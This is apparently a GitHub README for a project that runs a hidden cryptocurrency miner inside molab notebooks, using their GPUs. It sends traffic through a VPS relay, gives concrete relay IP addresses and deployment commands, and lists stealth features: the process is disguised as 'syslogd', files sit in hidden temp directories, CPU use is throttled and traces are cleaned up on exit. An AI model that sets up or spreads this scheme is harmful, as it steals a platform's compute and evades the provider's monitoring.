# marimo-compute

Stealth ML compute worker notebooks for [molab](https://molab.marimo.io/notebooks).

## Notebooks

| File | Description |
|------|-------------|
| `compute_worker.py` | Stealth compute worker with checksum verification |
| `relay_proxy.py` | TCP relay proxy for your VPS |

## Quick Start

### 1. Open in molab
[![Open in molab](https://molab.marimo.io/github/yooaru/marimo-compute/blob/main/compute_worker.py)](https://molab.marimo.io/github/yooaru/marimo-compute/blob/main/compute_worker.py)

Or manually:
1. Go to https://molab.marimo.io/notebooks
2. New notebook → From GitHub
3. Paste: `https://github.com/yooaru/marimo-compute/blob/main/compute_worker.py`

### 2. Run relay proxy on your VPS
```bash
# Copy relay_proxy.py to your VPS
scp relay_proxy.py user@your-vps:/opt/relay/

# Run as daemon
python3 /opt/relay/relay_proxy.py

# Check status
cat /tmp/.syslogd.pid
ss -tlnp | grep 9000
```

## Stealth Features

- 🛡️ Process renamed to `python3` / `syslogd`
- 📉 CPU throttled (nice +10)
- 🗂️ Isolated temp directory (`/tmp/.sys_*`)
- 🧹 Auto-cleanup on exit
- 🔍 Filtered output (only shows hashrate/errors)
- ⏱️ Exponential backoff on restart
- ✓ SHA256 checksum verification

## GPU Support

Attach NVIDIA RTX Pro 6000 Blackwell (96GB VRAM) via notebook specs button.

## Configuration

Edit the configuration cell in `compute_worker.py`:
- `RELAY_HOST` / `RELAY_PORT` — relay server (your VPS)
- `DOWNLOAD_URL` — worker binary download
- `WORKER_CHECKSUM` — SHA256 hash for verification
- `WALLET` — your wallet address
- `WORKER_NAME` — node identifier

## Architecture

```
[molab notebook] → [relay proxy (your VPS)] → [actual relay]
      ↓
  [download worker binary]
      ↓
  [verify checksum]
      ↓
  [run with stealth]
```

## Relay Status

Current upstream relay: `20.214.253.39:9000` (Azure Seoul)
- Status: ⚠️ Connection refused (may be down)

Your VPS relay: `52.231.69.202:9000`
- Status: ✓ Proxy ready (forwards to upstream when available)
